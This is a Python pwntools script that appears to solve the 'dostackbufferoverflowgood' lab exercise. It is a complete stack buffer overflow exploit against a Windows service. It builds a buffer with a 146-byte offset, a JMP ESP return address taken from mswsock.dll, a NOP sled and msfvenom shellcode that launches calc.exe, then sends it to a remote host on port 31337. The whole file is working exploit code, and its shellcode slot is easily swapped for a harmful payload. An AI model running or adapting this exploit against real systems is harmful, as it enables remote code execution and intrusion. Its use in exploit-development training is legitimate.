from pwn import *

# https://github.com/justinsteven/dostackbufferoverflowgood

size = 600
offset = 146

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a'
shellcode =  b""
shellcode += b"\xbd\x78\xa4\x2c\x9e\xdd\xc3\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x31\x83\xc0\x04\x31\x68\x0f"
shellcode += b"\x03\x68\x77\x46\xd9\x62\x6f\x04\x22\x9b\x6f"
shellcode += b"\x69\xaa\x7e\x5e\xa9\xc8\x0b\xf0\x19\x9a\x5e"
shellcode += b"\xfc\xd2\xce\x4a\x77\x96\xc6\x7d\x30\x1d\x31"
shellcode += b"\xb3\xc1\x0e\x01\xd2\x41\x4d\x56\x34\x78\x9e"
shellcode += b"\xab\x35\xbd\xc3\x46\x67\x16\x8f\xf5\x98\x13"
shellcode += b"\xc5\xc5\x13\x6f\xcb\x4d\xc7\x27\xea\x7c\x56"
shellcode += b"\x3c\xb5\x5e\x58\x91\xcd\xd6\x42\xf6\xe8\xa1"
shellcode += b"\xf9\xcc\x87\x33\x28\x1d\x67\x9f\x15\x92\x9a"
shellcode += b"\xe1\x52\x14\x45\x94\xaa\x67\xf8\xaf\x68\x1a"
shellcode += b"\x26\x25\x6b\xbc\xad\x9d\x57\x3d\x61\x7b\x13"
shellcode += b"\x31\xce\x0f\x7b\x55\xd1\xdc\xf7\x61\x5a\xe3"
shellcode += b"\xd7\xe0\x18\xc0\xf3\xa9\xfb\x69\xa5\x17\xad"
shellcode += b"\x96\xb5\xf8\x12\x33\xbd\x14\x46\x4e\x9c\x72"
shellcode += b"\x99\xdc\x9a\x30\x99\xde\xa4\x64\xf2\xef\x2f"
shellcode += b"\xeb\x85\xef\xe5\x48\x79\xba\xa4\xf8\x12\x63"
shellcode += b"\x3d\xb9\x7e\x94\xeb\xfd\x86\x17\x1e\x7d\x7d"
shellcode += b"\x07\x6b\x78\x39\x8f\x87\xf0\x52\x7a\xa8\xa7"
shellcode += b"\x53\xaf\xcb\x26\xc0\x33\x22\xcd\x60\xd1\x3a"

buf = b"A" * offset
buf += p32(0x7482E645) # findjmp.exe mswsock.dll esp
buf += b"\x90" * 20
buf += shellcode
buf += b"\x90" * (size- len(buf)) 
buf += b"\n"

s = remote('172.20.178.246',31337)
s.send(buf)
s.recv()
s.close()
